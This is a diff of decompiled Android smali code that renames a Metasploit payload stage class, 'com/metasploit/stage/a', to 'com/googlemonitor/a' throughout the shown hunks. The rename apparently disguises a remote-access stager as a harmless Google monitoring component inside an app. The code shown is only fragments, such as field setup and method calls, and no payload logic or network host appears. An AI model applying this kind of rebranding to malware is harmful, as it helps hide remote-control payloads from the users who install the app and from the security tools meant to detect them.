@@ -1,7 +1,7 @@
-.class public final Lcom/metasploit/stage/a;
+.class public final Lcom/googlemonitor/a;
 .super Ljava/lang/Object;
 
-
+ 
 # instance fields
 .field public a:I
 
@@ -22,7 +22,7 @@
 
     invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V
 
-    iput-object v0, p0, Lcom/metasploit/stage/a;->d:Ljava/util/List;
+    iput-object v0, p0, Lcom/googlemonitor/a;->d:Ljava/util/List;
 
     return-void
 .end method
@@ -36,7 +36,7 @@
 
     const/4 v1, 0x0
 
-    invoke-static {p2}, Lcom/metasploit/stage/a;->a(Ljava/lang/String;)Z
+    invoke-static {p2}, Lcom/googlemonitor/a;->a(Ljava/lang/String;)Z
 
     move-result v0
 
@@ -62,7 +62,7 @@
 
     aget-object v4, v2, v0
 
-    invoke-static {v4}, Lcom/metasploit/stage/a;->a(Ljava/lang/String;)Z
+    invoke-static {v4}, Lcom/googlemonitor/a;->a(Ljava/lang/String;)Z
 
     move-result v5
 
@@ -80,7 +80,7 @@
 
     aget-object v5, v4, v1
 
-    invoke-static {v5}, Lcom/metasploit/stage/a;->a(Ljava/lang/String;)Z
+    invoke-static {v5}, Lcom/googlemonitor/a;->a(Ljava/lang/String;)Z
 
     move-result v5
 
@@ -88,7 +88,7 @@
 
     aget-object v5, v4, v6
 
-    invoke-static {v5}, Lcom/metasploit/stage/a;->a(Ljava/lang/String;)Z
+    invoke-static {v5}, Lcom/googlemonitor/a;->a(Ljava/lang/String;)Z
 
     move-result v5
 
